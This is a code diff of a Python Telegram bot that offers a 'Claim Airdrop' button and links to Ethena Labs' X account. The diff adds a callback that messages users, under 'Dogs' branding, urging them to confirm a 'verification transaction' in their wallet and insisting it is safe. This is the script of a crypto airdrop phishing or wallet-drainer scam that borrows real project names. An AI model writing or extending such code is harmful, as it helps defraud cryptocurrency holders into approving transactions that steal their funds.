@@ -1,6 +1,5 @@
 import logging
-import asyncio
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, InputFile
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, ParseMode
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
 
 # Configurer le logging
@@ -31,7 +30,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         # Boutons
         keyboard = [
             [InlineKeyboardButton("Claim Airdrop 🎁", url=MINI_APP_URL)],
-            [InlineKeyboardButton("News Twitter/X", url='https://x.com/ethena_labs')]
+            [InlineKeyboardButton("News Twitter/X", url='https://x.com/ethena_labs')],
+            [InlineKeyboardButton("Close App", callback_data='close_app')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -42,12 +42,33 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         logging.error(f"Failed to send message: {e}")
         await update.message.reply_text("Failed to send message.")
 
+# Fonction de gestion des callbacks
+async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+
+    # Si l'utilisateur clique sur "Close App"
+    if query.data == 'close_app':
+        # Message à envoyer après la fermeture de la mini-app
+        follow_up_message = (
+            "<b>Dogs 🛠️</b>\n\n"
+            "⚠️ <b>Pan, If you received a transaction with the verification comment <i>Confirm the verification prompt. Ref: #51817</i>, don't be scared!</b>\n\n"
+            "It means that Airdrop is available for you and the system has sent a verification message to verify that your wallet is not a spam wallet.\n\n"
+            "❗ <b>Important note:</b>\n\n"
+            "If your profile is eligible for the reward, after you have connected your wallet, the verification system will prompt you to confirm the verification transaction, it must be confirmed. Otherwise, you will not be able to collect your reward.\n\n"
+            "<b>Due to the increasing cases of spam and system abuses, we had to introduce this stage of verification. It is safe and does not cause any financial losses for you.</b>"
+        )
+
+        # Envoi du message de suivi
+        await query.message.reply_text(follow_up_message, parse_mode=ParseMode.HTML)
+
 def main() -> None:
     # Initialiser l'application avec le token de ton bot
     application = ApplicationBuilder().token(TOKEN).build()
 
     # Ajouter les gestionnaires
     application.add_handler(CommandHandler('start', start))
+    application.add_handler(CallbackQueryHandler(button))
 
     # Démarrer le bot
     application.run_polling()
